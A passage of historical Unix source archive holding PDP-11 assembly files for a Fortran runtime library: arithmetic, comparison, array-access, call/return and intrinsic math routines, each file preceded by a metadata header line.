	add	$8.,r0
	mov	-(r0),-(sp)
	mov	-(r0),-(sp)
	mov	-(r0),-(sp)
	mov	-(r0),-(sp)
	jmp	*(r4)+

rval4:
	mov	(r4)+,r0
	mov	2(r0),-(sp)
	mov	(r0),-(sp)
	jmp	*(r4)+

do22:
	mov	(sp)+,r1
	br	1f

do12:
	mov	$1,r1
1:
	mov	(sp)+,r2
	mov	(sp)+,r0
	add	r1,(r0)
	cmp	(r0),r2
	bgt	goto
	tst	(r4)+
	jmp	*(r4)+

do24:
do2:
	mov	(sp)+,r2
	mov	(sp)+,r1
	br	1f

do14:
do1:
	clr	r2
	mov	$1,r1
1:
	mov	4(sp),r0
	add	r1,2(r0)
	adc	r2
	add	r2,(r0)
	cmp	(r0)+,(sp)+
	bgt	1f
	blt	2f
	cmp	(r0),(sp)
	bhi	1f
2:
	cmp	(sp)+,(sp)+
	tst	(r4)+
	jmp	*(r4)+

1:
	cmp	(sp)+,(sp)+
goto:
	mov	(r4),r4
	jmp	*(r4)+

cgoto:
	tst	(sp)+
	mov	(sp)+,r0
	asl	r0
	add	r4,r0
1:
	tst	(r4)+
	beq	gotoe
	cmp	r0,r4
	bne	1b
	mov	-(r0),r4
	jmp	*(r4)+
cagoto:
	tst	(sp)+
	mov	(sp)+,r0
1:
	tst	(r4)
	beq	gotoe
	cmp	r0,(r4)+
	bne	1b
	mov	r0,r4
	jmp	*(r4)+

agoto:
	tst	(sp)+
	mov	(sp)+,r4
	jmp	*(r4)+

gotoe:
	jsr	r5,rerr; 14.

-- /usr/source/fort/rt/r2.s mode=0100664 uid=3 gid=3 atime=174921004 mtime=174844733 --
/
/

/ r2 -- comparison of 4-byte integers

.globl	ilt4
.globl	ile4
.globl	ieq4
.globl	ine4
.globl	ige4
.globl	igt4
.globl	lan2
.globl	lor2
.globl	lnt2
.globl	ieq2
.globl	ile2
.globl	igt2
.globl	ige2
.globl	leq2
.globl	ine2
.globl	ilt2
.globl	lne2
.globl	leq1
.globl	lne1

ilt4:
	jsr	pc,compar
	blt	one
	br	zero
	blo	one
	br	zero

ile4:
	jsr	pc,compar
	ble	one
	br	zero
	blos	one
	br	zero

ieq4:
	jsr	pc,compar
	beq	one
	br	zero
	beq	one
	br	zero

ine4:
	jsr	pc,compar
	bne	one
	br	zero
	bne	one
	br	zero

ige4:
	jsr	pc,compar
	bge	one
	br	zero
	bhis	one
	br	zero

igt4:
	jsr	pc,compar
	bgt	one
	br	zero
	bhi	one
	br	zero

one:
	mov	$1,(sp)
	jmp	*(r4)+

zero:
	clr	(sp)
	jmp	*(r4)+

compar:
	mov	(sp)+,r0
	mov	(sp)+,r1
	mov	(sp)+,r2
	cmp	(sp)+,r1
	beq	1f
	jmp	(r0)
1:
	cmp	(sp),r2
	jmp	4(r0)

lor2:
	bis	(sp)+,(sp)
	jmp	*(r4)+

lan2:
	tst	(sp)+
	bne	1f
	clr	(sp)
1:
	jmp	*(r4)+

lnt2:
	tst	(sp)
	beq	one
	br	zero

ieq2:
leq2:
	cmp	(sp)+,(sp)
	beq	one
	br	zero

ilt2:	cmp	(sp)+,(sp)
	bgt	one
	br	zero

ile2:
	cmp	(sp)+,(sp)
	bge	one
	br	zero

igt2:
	cmp	(sp)+,(sp)
	blt	one
	br	zero

ige2:
	cmp	(sp)+,(sp)
	ble	one
	br	zero

ine2:
lne2:
	cmp	(sp)+,(sp)
	bne	one
	br	zero

leq1:
	cmpb	(sp)+,(sp)
	beq	one
	br	zero

lne1:
	cmpb	(sp)+,(sp)
	bne	one
	br	zero

-- /usr/source/fort/rt/r3.s mode=0100664 uid=3 gid=3 atime=174921006 mtime=174844737 --
/
/

/ r3 -- comparisons

.globl	lif2
.globl	lif1
.globl	rif4
.globl	iif2
.globl	iif4
.globl	rif8

lif2:
lif1:
	tst	(sp)+
	bne	1f
	mov	(r4),r4
	jmp	*(r4)+
1:
	tst	(r4)+
	jmp	*(r4)+

rif8:
	setd
	tstf	(sp)+
	cfcc
	br	2f

iif4:
rif4:
	mov	(sp)+,r0
	mov	(sp)+,r1
	tst	r0
	bne	2f
	tst	r1
	cln
	br	2f

iif2:
	tst	(sp)+
2:
	bmi	1f
	beq	2f
	tst	(r4)+
2:
	tst	(r4)+
1:
	mov	(r4),r4
	jmp	*(r4)+

-- /usr/source/fort/rt/r4.s mode=0100664 uid=3 gid=3 atime=174921008 mtime=174844741 --
/
/

/ r4 -- short integer arithmetic

.globl	iad2
.globl	isb2
.globl	imp2
.globl	idv2
.globl	i2i4
.globl	i1i4
.globl	i4i2
.globl	i4i1
.globl	ing2
.globl	rval2
.globl	rval1
.globl	l2l1

iad2:
	add	(sp)+,(sp)
	jmp	*(r4)+

isb2:
	sub	(sp)+,(sp)
	jmp	*(r4)+

imp2:
	mov	(sp)+,r1
	mul	(sp)+,r1
	mov	r1,-(sp)
	jmp	*(r4)+

idv2:
	mov	2(sp),r1
	sxt	r0
	div	(sp)+,r0
	mov	r0,(sp)
	jmp	*(r4)+

i4i2:
i4i1:
	tst	(sp)+
	jmp	*(r4)+

i2i4:
i1i4:
	tst	(sp)
	sxt	-(sp)
	jmp	*(r4)+

ing2:
	neg	(sp)
	jmp	*(r4)+

rval2:
	mov	*(r4)+,-(sp)
	jmp	*(r4)+

rval1:
	movb	*(r4)+,r0
	mov	r0,-(sp)

l2l1:
	jmp	*(r4)+

-- /usr/source/fort/rt/r5.s mode=0100664 uid=3 gid=3 atime=174921010 mtime=174844745 --
/
/

/ r5 -- long integer arithmetic

.globl	iad4
.globl	isb4
.globl	imp4
.globl	idv4
.globl	ing4
.globl	rerr

iad4:
	jsr	pc,load
	addf	fr0,fr1
	br	store

isb4:
	jsr	pc,load
	subf	fr0,fr1
	br	store

imp4:
	jsr	pc,load
	mulf	fr0,fr1
	br	store

idv4:
	jsr	pc,load
	divf	fr0,fr1

store:
	movfi	fr1,-(sp)
	jmp	*(r4)+

load:
	mov	(sp)+,r0
	setd
	setl
	movif	(sp)+,fr0
	movif	(sp)+,fr1
	jmp	(r0)

ing4:
	neg	(sp)
	neg	2(sp)
	sbc	(sp)
	jmp	*(r4)+

-- /usr/source/fort/rt/r6.s mode=0100664 uid=3 gid=3 atime=174921012 mtime=174844750 --
/
/

/ r6 -- real arithmetic

.globl	rad4
.globl	rad8
.globl	rsb4
.globl	rsb8
.globl	rmp4
.globl	rmp8
.globl	rdv4
.globl	rdv8
.globl	rng4
.globl	rng8
.globl	r4r8
.globl	r8r4
.globl	i4r4
.globl	i2r4
.globl	r4i4
.globl	r8i2
.globl	i2r8
.globl	r4i2
.globl	i4r8
.globl	r8i4
.globl	rerr

rad8:
	setd
	br	1f
rad4:
	setf
1:
	movf	(sp)+,fr0
	addf	(sp)+,fr0
	br	store

rsb8:
	setd
	br	1f
rsb4:
	setf
1:
	movf	(sp)+,fr0
	negf	fr0
	addf	(sp)+,fr0
	br	store

rmp8:
	setd
	br	1f
rmp4:
	setf
1:
	movf	(sp)+,fr0
	mulf	(sp)+,fr0
	br	store

rdv8:
	setd
	br	1f
rdv4:
	setf
1:
	movf	(sp)+,fr1
	movf	(sp)+,fr0
	divf	fr1,fr0

store:
	movf	fr0,-(sp)
	jmp	*(r4)+

rng8:
	setd
	br	1f
rng4:
	setf
1:
	negf	(sp)
	jmp	*(r4)+

r8r4:
	setd
	br	1f
r4r8:
	setf
1:
	movf	(sp)+,fr0
	movfo	fr0,-(sp)
	jmp	*(r4)+

i2r8:
	seti
	br	1f

i4r8:
	setl
1:
	setd
	br	2f

i2r4:
	seti
	br	1f

i4r4:
	setl
1:
	setf
2:
	movif	(sp)+,fr0
	movf	fr0,-(sp)
	jmp	*(r4)+

r8i2:
	seti
	br	1f

r8i4:
	setl
1:
	setd
	br	2f

r4i2:
	seti
	br	1f

r4i4:
	setl
1:
	setf
2:
	movf	(sp)+,fr0
	movfi	fr0,-(sp)
	jmp	*(r4)+

-- /usr/source/fort/rt/r7.s mode=0100664 uid=3 gid=3 atime=174921014 mtime=174844754 --
/
/

/ r7 -- fortran runtime

achk	= 1 / 1 to check array bounds
.globl	lvalp
.globl	rval1p
.globl	rval2p
.globl	rval4p
.globl	rval8p
.globl	alval
.globl	alvalp
.globl	arval
.globl	arvalp

.globl	rerr

lvalp:
	mov	r3,r0
	add	(r4)+,r0
	mov	(r0)+,-(sp)
	jmp	*(r4)+

rval1p:
	mov	r3,r0
	add	(r4)+,r0
	movb	*(r0)+,-(sp)
	jmp	*(r4)+

rval2p:
	mov	r3,r0
	add	(r4)+,r0
	mov	*(r0)+,-(sp)
	jmp	*(r4)+

rval4p:
	mov	r3,r0
	add	(r4)+,r0
	mov	(r0),r0
	cmp	(r0)+,(r0)+
	mov	-(r0),-(sp)
	mov	-(r0),-(sp)
	jmp	*(r4)+

rval8p:
	setd
	mov	r3,r0
	add	(r4)+,r0
	movf	*(r0)+,fr0
	movf	fr0,-(sp)
	jmp	*(r4)+

alval:
	jsr	r5,getsub; 1
	mov	(r4)+,-(sp)
	add	r1,(sp)
	jmp	*(r4)+

arvalp:
	jsr	r5,getsub; 0
	mov	r3,r2
	add	(r4)+,r2
	mov	(r2),r2
	br	1f

arval:
	jsr	r5,getsub; 1
	mov	(r4)+,r2
1:
	add	r2,r1
	mov	-(r0),r2
	asr	r2
	bcc	1f
	movb	(r1),-(sp)
	jmp	*(r4)+
1:
	add	(r0),r1
1:
	mov	-(r1),-(sp)
	sob	r2,1b
	jmp	*(r4)+

getsub:
	tst	(sp)+
	mov	(r4)+,r0
	mov	(r0)+,r2
	clr	r1
	tst	(r0)+
1:
	tst	(sp)+
	dec	(sp)
	add	(sp)+,r1
	mpy	(r0)+,r1
	sob	r2,1b

	tst	(r5)+
	beq	2f
	mov	r1,-(sp)
	mov	-2(r4),r0
	mov	(r0)+,r2
	inc	r2
	mov	$1,r1
1:
	mpy	(r0)+,r1
	sob	r2,1b
.if achk
	cmp	r1,(sp)
	bhi	1f
	jsr	r5,rerr; 15.
.endif
1:
	mov	(sp)+,r1

2:
	jmp	(r5)

alvalp:
	jsr	r5,getsub; 0
	mov	r3,r0
	add	(r4)+,r0
	mov	(r0),-(sp)
	add	r1,(sp)
	jmp	*(r4)+
-- /usr/source/fort/rt/r8.s mode=0100664 uid=3 gid=3 atime=174921016 mtime=174844758 --
/
/

/ r8 - fortran runtime -- powers of integers

.globl	ipi2

ipi2:
	tst	(sp)+
	mov	(sp)+,r0
	bge	1f
	clr	(sp)
	jmp	*(r4)+
1:
	mov	(sp)+,r1
	mov	r3,-(sp)
	mov	$1,r3
1:
	tst	r0
	beq	1f
	asr	r0
	bcc	2f
	mpy	r1,r3
2:
	mpy	r1,r1
	br	1b
1:
	mov	r3,r1
	mov	(sp)+,r3
	mov	r1,-(sp)
	jmp	*(r4)+

-- /usr/source/fort/rt/r9.s mode=0100664 uid=3 gid=3 atime=174921018 mtime=174844762 --
/
/

one = 40200
/  r9 -- fortran runtime -- real**integer

.globl	ipi4
.globl	rpi4
.globl	rpi8

.globl	rerr

ipi4:
	setf
	setl
	movif	4(sp),fr0
	movf	fr0,4(sp)
	jsr	r5,1f
	movfi	fr1,-(sp)
	jmp	*(r4)+

rpi4:
	setf
	br	2f

rpi8:
	setd
2:
	jsr	r5,1f
	movf	fr1,-(sp)
	jmp	*(r4)+

1:
	cmp	(sp)+,(sp)+		/ jsr + msp of i4
	mov	(sp)+,r0
	movf	$one,fr1
	movf	(sp)+,fr0
	tst	r0
	bgt	1f
	cfcc
	beq	9f
	tst	r0
	beq	3f
	divf	fr0,fr1
	movf	fr1,fr0
	neg	r0
	movf	$one,fr1
1:
	asr	r0
	bcc	2f
	mulf	fr0,fr1
2:
	tst	r0
	beq	3f
	mulf	fr0,fr0
	br	1b
3:
	jmp	(r5)

9:
	jsr	r5, rerr; 17.
-- /usr/source/fort/rt/ra.s mode=0100664 uid=3 gid=3 atime=174921020 mtime=174844767 --
/
/

/ ra -- fortran runtime --  real ** real

.globl	rpr4
.globl	rpr8

.globl	log
.globl	exp
.globl	rerr

rpr8:
	setd
	br	1f

rpr4:
	setf

1:
	seti
	movf	(sp)+,fr1
	movf	(sp)+,fr0
	cfcc
	beq	3f			/ 0**x
	movf	fr1,-(sp)
	jsr	pc,log
	bes	error
	mulf	(sp)+,fr0
	jsr	pc,exp
	bes	error
2:
	movf	fr0,-(sp)
	jmp	*(r4)+

3:
	tstf	r1
	cfcc
	bgt	2b

error:
	jsr	r5,rerr; 17.

-- /usr/source/fort/rt/rb.s mode=0100664 uid=3 gid=3 atime=174921022 mtime=174844770 --
/
/

/ rb -- funct/subr stuff

.globl	call
.globl	callp
.globl	retrn
.globl	stsp

callp:
	mov	(r4)+,r0
	add	r3,r0
	mov	(r0),r0
	br	1f

call:
	mov	(r4)+,r0
1:
	mov	r3,-(sp)
	mov	(r4)+,r3
	mov	r4,-(sp)
	mov	r0,r4
	mov	(r4)+,-(sp)		/ lv of funct
	jmp	*(r4)+

retrn:
	mov	r3,r0
	mov	(sp)+,r1		/ lv of funct
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(r0),sp
	tst	(r4)+		/ arg count
	mov	(r4)+,r0		/ return byte count
	inc	r0
	bic	$1,r0
	add	r0,r1
1:
	sub	$2,r0
	blt	1f
	mov	-(r1),-(sp)
	br	1b
1:
	jmp	*(r4)+

stsp:
	mov	sp,*(r4)+
	jmp	*(r4)+

-- /usr/source/fort/rt/rc.s mode=0100664 uid=3 gid=3 atime=174921024 mtime=174844775 --
/
/

/ rc -- complex arithmetic

.globl	c8c16
.globl	c16c8
.globl	i4c8
.globl	r4c8
.globl	r8c8
.globl	i4c16
.globl	r4c16
.globl	r8c16
.globl	cad8
.globl	csb8
.globl	cmp8
.globl	cdv8
.globl	cng8
.globl	cad16
.globl	csb16
.globl	cmp16
.globl	cdv16
.globl	cng16
.globl	rval16
.globl	rval16p
.globl	gas16
.globl	ceq8
.globl	cne8
.globl	ceq16
.globl	cne16

.globl	cpi8
.globl	cpi16

one = 040200
a = r2
b = r3
c = r4
d = r5

e = r0
f = r1

gas16:
	mov	16.(sp),r0
	setd
	movf	(sp)+,a
	movf	(sp)+,b
	tst	(sp)+
	movf	a,(r0)+
	movf	b,(r0)+
	jmp	*(r4)+

rval16p:
	mov	r3,r0
	add	(r4)+,r0
	mov	(r0),r0
	br	1f

rval16:
	mov	(r4)+,r0
1:
	setd
	movf	(r0)+,a
	movf	(r0)+,b
	movf	b,-(sp)
	movf	a,-(sp)
	jmp	*(r4)+

cad16:
	setd
	br	1f

cad8:
	setf
1:
	jsr	pc,garg
	addf	a,e
	addf	b,f
	br	sarg

csb16:
	setd
	br	1f

csb8:
	setf
1:
	jsr	pc,garg
	subf	a,e
	negf	e
	subf	b,f
	negf	f
	br	sarg

cmp16:
	setd
	br	1f

cmp8:
	setf
1:
	jsr	pc,garg
	mulf	a,e
	mulf	b,f
	subf	f,e
	mulf	d,a
	mulf	c,b
	movf	a,f
	addf	b,f

sarg:
	movf	f,-(sp)
	movf	e,-(sp)
	jmp	*(r4)+

cdv16:
	setd
	br	1f

cdv8:
	setf
1:
divide:
	jsr	pc,garg
	absf	e
	absf	f
	cmpf	e,f
	cfcc
	blt	1f

/ algorithm #1 |c| > |d|

	movf	d,e
	divf	c,e		/ r = d/c
	movf	d,f
	mulf	e,f
	addf	c,f		/ x = c+rd
	movf	f,c
	movf	a,f
	mulf	e,f
	negf	f
	addf	b,f
	mulf	b,e
	addf	a,e
	divf	c,e
	divf	c,f
	br	sarg

/ algorithm #2 |c| < |d|

1:
	movf	c,e
	divf	d,e		/ r = c/d
	movf	c,f
	mulf	e,f
	addf	d,f		/ x = d+rc
	movf	f,c
	movf	b,f
	mulf	e,f
	subf	a,f
	mulf	a,e
	addf	b,e
	divf	c,e
	divf	c,f
	br	sarg

cng16:
	setd
	br	1f

cng8:
	setf
1:
	movf	(sp)+,a
	negf	a
	negf	(sp)
	movf	a,-(sp)
	jmp	*(r4)+

/ setup the following registers
/ (a,bi) +o (c,di) -> (e+fi)
/ a,b,c,d are input
/ e,f are output and also contain
/ c,d on input

garg:
	mov	(sp)+,r0
	movf	(sp)+,e
	movf	e,c
	movf	(sp)+,f
	movf	f,d
	movf	(sp)+,a
	movf	(sp)+,b
	jmp	(r0)

i4c8:
	setf
	br	1f

i4c16:
	setd
1:
	setl
	movif	(sp)+,fr0
	br	2f

r4c8:
	setf
	br	1f

r8c16:
	setd
1:
	movf	(sp)+,fr0
	br	2f

r4c16:
	setd
	br	1f

r8c8:
	setf
1:
	movof	(sp)+,fr0
2:
	clrf	-(sp)
	movf	fr0,-(sp)
	jmp	*(r4)+

c16c8:
	setd
	br	1f

c8c16:
	setf
1:
	movf	(sp)+,r0
	movf	(sp)+,r1
	movfo	r1,-(sp)
	movfo	r0,-(sp)
	jmp	*(r4)+

ceq16:
	setd
	br	1f
ceq8:
	setf
1:
	mov	$1,r1
	br	2f

cne16:
	setd
	br	1f

cne8:
	setf
1:
	clr	r1
2:
	jsr	pc,garg
	cmpf	c,a
	cfcc
	bne	1f
	cmpf	d,b
	cfcc
	beq	2f
1:
	inc	r1
	bic	$2,r1
2:
	mov	r1,-(sp)
	jmp	*(r4)+

cpi8:
	setf
	br	1f

cpi16:
	setd
1:
	clr	r0
	tst	(sp)+
	mov	(sp)+,r1
	bge	1f
	inc	r0
	neg	r1
1:
	movf	(sp)+,fr0
	movf	fr0,fr4
	movf	(sp)+,fr0
	movf	fr0,fr5
	movf	$one,fr0
	clrf	fr1
1:
	dec	r1
	bmi	1f
	movf	fr0,fr2
	movf	fr1,fr3
	mulf	fr4,fr0
	mulf	fr4,fr1
	mulf	fr5,fr2
	mulf	fr5,fr3
	subf	fr3,fr0
	addf	fr2,fr1
	br	1b
1:
	tst	r0
	beq	1f
	clrf	-(sp)
	movf	$one,fr2
	movf	fr2,-(sp)
	movf	fr1,-(sp)
	movf	fr0,-(sp)
	jmp	divide
1:
	movf	fr1,-(sp)
	movf	fr0,-(sp)
	jmp	*(r4)+
-- /usr/source/fort/rt/rd.s mode=0100664 uid=3 gid=3 atime=174921027 mtime=174844779 --
/
/

/ rd -- short list I/O do loop

.globl	slist1
.globl	slist2
.globl	slist3

.globl	temp

slist1:
	mov	(r4)+,r0
	mov	(r0)+,r2
	mov	$1,r1
1:
	mpy	(r0)+,r1
	sob	r2,1b
	mov	$temp,r2
	mov	r1,(r2)+
	clr	(r2)+
	mov	(r0)+,(r2)+
	jmp	*(r4)+

slist2:
	mov	(r4)+,r0
	dec	temp
	ble	1f
	mov	r0,r4
1:
	jmp	*(r4)+

slist3:
	mov	$temp+2,r0
	add	(r0)+,(sp)
	add	(r0),-(r0)
	jmp	*(r4)+

-- /usr/source/fort/rt/re.s mode=0100664 uid=3 gid=3 atime=174921029 mtime=174844782 --
/
/

/ re -- comparison of 8-byte quantities

.globl	rle8
.globl	rlt8
.globl	req8
.globl	rne8
.globl	rge8
.globl	rgt8
rlt8:
	jsr	pc,compar
	blt	one
	br	zero

rle8:
	jsr	pc,compar
	ble	one
	br	zero

req8:
	jsr	pc,compar
	beq	one
	br	zero

rne8:
	jsr	pc,compar
	bne	one
	br	zero

rge8:
	jsr	pc,compar
	bge	one
	br	zero

rgt8:
	jsr	pc,compar
	bgt	one
	br	zero

one:
	mov	$1,-(sp)
	jmp	*(r4)+

zero:
	clr	-(sp)
	jmp	*(r4)+

compar:
	setd
	mov	(sp)+,r0
	movf	(sp)+,fr0
	cmpf	(sp)+,fr0
	cfcc
	jmp	(r0)

-- /usr/source/fort/rt/rf.s mode=0100664 uid=3 gid=3 atime=174921031 mtime=174844786 --
/
/

/ rf -- real comparisons

.globl	rlt4
.globl	rle4
.globl	req4
.globl	rne4
.globl	rge4
.globl	rgt4

rlt4:
	jsr	pc,compar
	blt	one
	br	zero

rle4:
	jsr	pc,compar
	ble	one
	br	zero

req4:
	jsr	pc,compar
	beq	one
	br	zero

rne4:
	jsr	pc,compar
	bne	one
	br	zero

rge4:
	jsr	pc,compar
	bge	one
	br	zero

rgt4:
	jsr	pc,compar
	bgt	one
	br	zero

one:
	mov	$1,-(sp)
	jmp	*(r4)+

zero:
	clr	-(sp)
	jmp	*(r4)+

compar:
	mov	(sp)+,r0
	setf
	movf	(sp)+,r0
	cmpf	(sp)+,r0
	cfcc
	jmp	(r0)

-- /usr/source/fort/rt/rg.s mode=0100664 uid=3 gid=3 atime=174921032 mtime=174844791 --
/
/

/ rg -- assignments

.globl	gmv1
.globl	gmv2
.globl	gmv4
.globl	gmv8
.globl	gmv16
.globl	stst

gmv1:
	movb	(sp)+,*(r4)+
	jmp	*(r4)+

gmv2:
stst:
	mov	(sp)+,*(r4)+
	jmp	*(r4)+

gmv4:
	mov	(r4)+,r0
	mov	(sp)+,(r0)+
	mov	(sp)+,(r0)+
	jmp	*(r4)+

gmv8:
	setd
	movf	(sp)+,fr0
	movf	fr0,*(r4)+
	jmp	*(r4)+

gmv16:
	setd
	mov	(r4)+,r0
	movf	(sp)+,fr0
	movf	fr0,(r0)+
	movf	(sp)+,fr0
	movf	fr0,(r0)+
	jmp	*(r4)+

.globl	gmv1p
.globl	gmv2p
.globl	gmv4p
.globl	gmv8p
.globl	gmv16p

gmv1p:
	mov	(r4)+,r0
	add	r3,r0
	movb	(sp)+,*(r0)+
	jmp	*(r4)+

gmv2p:
	mov	(r4)+,r0
	add	r3,r0
	mov	(sp)+,*(r0)+
	jmp	*(r4)+

gmv4p:
	mov	(r4)+,r0
	add	r3,r0
	mov	(r0),r0
	mov	(sp)+,(r0)+
	mov	(sp)+,(r0)+
	jmp	*(r4)+

gmv8p:
	setd
	mov	(r4)+,r0
	add	r3,r0
	movf	(sp)+,fr0
	movf	fr0,*(r0)+
	jmp	*(r4)+

gmv16p:
	setd
	mov	(r4)+,r0
	add	r3,r0
	mov	(r0),r0
	movf	(sp)+,fr0
	movf	fr0,(r0)+
	movf	(sp)+,fr0
	movf	fr0,(r0)+
	jmp	*(r4)+

-- /usr/source/fort/rt/rh.s mode=0100664 uid=3 gid=3 atime=174921034 mtime=174844795 --
/
/

/ rh -- simple array l/r values

achk	= 1 / 1 to check array bounds
.globl	gal1
.globl	gal2
.globl	gal4
.globl	gal8
.globl	gal16
.globl	gar1
.globl	gar2
.globl	gar4
.globl	gar8
.globl	gar16

.globl	rerr

gal1:
	tst	(sp)+
	dec	(sp)
	br	1f

gal2:
	tst	(sp)+
	dec	(sp)
	asl	(sp)
	br	1f

gal4:
	tst	(sp)+
	dec	(sp)
	asl	(sp)
	asl	(sp)
	br	1f

gal8:
	tst	(sp)+
	dec	(sp)
	asl	(sp)
	asl	(sp)
	asl	(sp)
	br	1f

gal16:
	tst	(sp)+
	dec	(sp)
	asl	(sp)
	asl	(sp)
	asl	(sp)
	asl	(sp)

1:
	cmp	(sp),(r4)+
.if achk
	bhis	9f
.endif
	add	(r4)+,(sp)
	jmp	*(r4)+

9:
	jsr	r5,rerr; 15.
	4

gar1:
	tst	(sp)+
	dec	(sp)
	cmp	(sp),(r4)+
.if achk
	bhis	9b
.endif
	add	(r4)+,(sp)
	movb	*(sp)+,r0
	mov	r0,-(sp)
	jmp	*(r4)+

gar2:
	tst	(sp)+
	dec	(sp)
	asl	(sp)
	cmp	(sp),(r4)+
.if achk
	bhis	9b
.endif
	add	(r4)+,(sp)
	mov	*(sp)+,-(sp)
	jmp	*(r4)+

gar4:
	tst	(sp)+
	dec	(sp)
	mov	(sp)+,r0
	asl	r0
	asl	r0
	cmp	r0,(r4)+
.if achk
	bhis	9b
.endif
	add	(r4)+,r0
	cmp	(r0)+,(r0)+
	mov	-(r0),-(sp)
	mov	-(r0),-(sp)
	jmp	*(r4)+

gar8:
	setd
	tst	(sp)+
	dec	(sp)
	asl	(sp)
	asl	(sp)
	asl	(sp)
	cmp	(sp),(r4)+
.if achk
	bhis	9b
.endif
	add	(r4)+,(sp)
	movf	*(sp)+,fr0
	movf	fr0,-(sp)
	jmp	*(r4)+

gar16:
	setd
	tst	(sp)+
	dec	(sp)
	mov	(sp)+,r0
	asl	r0
	asl	r0
	asl	r0
	asl	r0
	cmp	r0,(r4)+
.if achk
	bhis	9b
.endif
	add	(r4)+,r0
	movf	(r0)+,fr0
	movf	(r0)+,fr1
	movf	fr1,-(sp)
	movf	fr0,-(sp)
	jmp	*(r4)+

-- /usr/source/fort/rt/rx.s mode=0100664 uid=3 gid=3 atime=174921037 mtime=174844798 --
/
/

/ rtx -- last routine

.globl	ecore

	.bss

ecore:
-- /usr/source/fort/rt1 mode=0140775 uid=3 gid=3 atime=174930096 mtime=174921147 --
-- /usr/source/fort/rt1/abs.s mode=0100664 uid=3 gid=3 atime=174921043 mtime=174844913 --
/
/

/ abs & dabs fortran functions

.globl	abs.
.globl	dabs.

.globl	retrn
.globl	temp

dabs.:	temp
	.+2
	setd
	br	1f

abs.:	temp
	.+2
	setf
1:
	movf	*2(r3),r0
	absf	r0
	movf	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/aimag.s mode=0100664 uid=3 gid=3 atime=174921045 mtime=174844918 --
/
/

/ aimag fortran function

.globl	aimag.

.globl	rval8p
.globl	retrn
.globl	temp

aimag.:	temp
	rval8p; 2
	.+2
	setf
	tstf	(sp)+
	movf	(sp)+,r0
	movf	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/aint.s mode=0100664 uid=3 gid=3 atime=174921047 mtime=174844922 --
/
/

/ aint fortran function

.globl	aint.
.globl	temp

one = 40200

.globl	retrn

aint.:	temp
	.+2
	setf
	movf	*2(r3),r0
	modf	$one,r0
	movf	r1,temp
	jmp	retrn
-- /usr/source/fort/rt1/alog.s mode=0100664 uid=3 gid=3 atime=174921049 mtime=174844926 --
/
/

/ alog & log fortran functions

.globl	alog.
.globl	dlog.

.globl	log
.globl	retrn
.globl	rerr
.globl	temp

dlog.:	temp
	.+2
	setd
	br	1f

alog.:	temp
	.+2
	setf
1:
	seti
	movf	*2(r3),r0
	jsr	pc,log
	bes	1f
	movf	r0,temp
	jmp	retrn

1:
	jsr	r5,rerr; 1
-- /usr/source/fort/rt1/alog10.s mode=0100664 uid=3 gid=3 atime=174921051 mtime=174844930 --
/
/

/ alog10 & dlog10 fortran functions

.globl	dlog10.
.globl	alog10.

.globl	log
.globl	retrn
.globl	rerr
.globl	temp

dlog10.:temp
	.+2
	setd
	br	1f

alog10.:temp
	.+2
	setf
1:
	movf	*2(r3),r0
	jsr	pc,log
	bes	1f
	mulf	const,r0
	movf	r0,temp
	jmp	retrn

1:
	jsr	r5,rerr; 1

const:	37736;55730;124467;24146
-- /usr/source/fort/rt1/amax0.s mode=0100664 uid=3 gid=3 atime=174921053 mtime=174844933 --
/
/

/ max0 & amax0 fortran functions

.globl	amax0.
.globl	max0.

.globl	retrn
.globl	temp

max0.:	temp
	.+2
	mov	pc,r2
	br	1f

amax0.:	temp
	.+2
	clr	r2
1:
	setf
	setl
	mov	*2(sp),r0		/ arg count
	mov	r3,r1
	tst	(r1)+			/ argpp
	movif	*(r1)+,r1
	br	2f
1:
	movif	*(r1)+,r0
	cmpf	r0,r1
	cfcc
	ble	2f
	movf	r0,r1
2:
	dec	r0
	bgt	1b
	tst	r2
	bne	1f
	movf	r1,temp
	br	2f
1:
	movfi	r1,temp
2:
	jmp	retrn
-- /usr/source/fort/rt1/amax1.s mode=0100664 uid=3 gid=3 atime=174921055 mtime=174844938 --
/
/

/ max1, amax1 & dmax1 fortran functions

.globl	amax1.
.globl	dmax1.
.globl	max1.

.globl	retrn
.globl	temp

max1.:	temp
	.+2
	setl
	setf
	mov	pc,r2		/ integer flag
	br	2f

dmax1.:	temp
	.+2
	setd
	br	1f

amax1.:	temp
	.+2
	setf
1:
	clr	r2		/ integer flag
2:
	mov	*2(sp),r0		/ arg count
	mov	r3,r1
	tst	(r1)+			/ argpp
	movf	*(r1)+,r1
	br	2f
1:
	movf	*(r1)+,r0
	cmpf	r0,r1
	cfcc
	ble	2f
	movf	r0,r1
2:
	dec	r0
	bgt	1b
	tst	r2
	bne	1f
	movf	r1,temp
	br	2f
1:
	movfi	r1,temp
2:
	jmp	retrn
-- /usr/source/fort/rt1/amin0.s mode=0100664 uid=3 gid=3 atime=174921057 mtime=174844942 --
/
/

/ min0 & amin0 fortran functions

.globl	amin0.
.globl	min0.

.globl	retrn
.globl	temp

min0.:	temp
	.+2
	mov	pc,r2
	br	1f

amin0.:	temp
	.+2
	clr	r2
1:
	setf
	setl
	mov	*2(sp),r0		/ arg count
	mov	r3,r1
	tst	(r1)+			/ argpp
	movif	*(r1)+,r1
	br	2f
1:
	movif	*(r1)+,r0
	cmpf	r0,r1
	cfcc
	bge	2f
	movf	r0,r1
2:
	dec	r0
	bgt	1b
	tst	r2
	bne	1f
	movf	r1,temp
	br	2f
1:
	movfi	r1,temp
2:
	jmp	retrn
-- /usr/source/fort/rt1/amin1.s mode=0100664 uid=3 gid=3 atime=174921058 mtime=174844946 --
/
/

/ min1, amin1 & dmin1 fortran functions

.globl	amin1.
.globl	dmin1.
.globl	min1.

.globl	retrn
.globl	temp

min1.:	temp
	.+2
	setl
	setf
	mov	pc,r2
	br	2f

dmin1.:	temp
	.+2
	setd
	br	1f

amin1.:	temp
	.+2
	setf
1:
	clr	r2
2:
	mov	*2(sp),r0		/ arg count
	mov	r3,r1
	tst	(r1)+			/ argpp
	movf	*(r1)+,r1
	br	2f
1:
	movf	*(r1)+,r0
	cmpf	r0,r1
	cfcc
	bge	2f
	movf	r0,r1
2:
	dec	r0
	bgt	1b
	tst	r2
	bne	1f
	movf	r1,temp
	br	2f
1:
	movfi	r1,temp
2:
	jmp	retrn
-- /usr/source/fort/rt1/amod.s mode=0100664 uid=3 gid=3 atime=174921060 mtime=174844949 --
/
/

